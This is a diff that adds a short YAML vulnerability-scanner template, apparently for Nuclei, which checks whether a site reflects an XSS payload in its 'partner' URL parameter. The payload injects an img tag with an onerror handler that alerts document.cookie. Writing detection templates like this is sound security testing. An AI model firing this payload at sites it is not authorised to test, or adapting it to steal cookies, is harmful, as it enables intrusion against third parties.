@@ -1,0 +1,39 @@
+id: kaue-xss-partner
+
+info:
+  name: kauexsspartner
+  author: kauenavarro
+  severity: medium
+  description: Procura por respostas refletidas.
+  tags: xss
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/en/?partner=%22%3E%3C%2Fa%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3B%3E%3C%2Fscript%3E"
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "></a><img src=x onerror=alert(document.cookie);></script>"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: word
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+        part: body
+        condition: and
+        negative: true
+
+      - type: status
+        status:
+          - 200
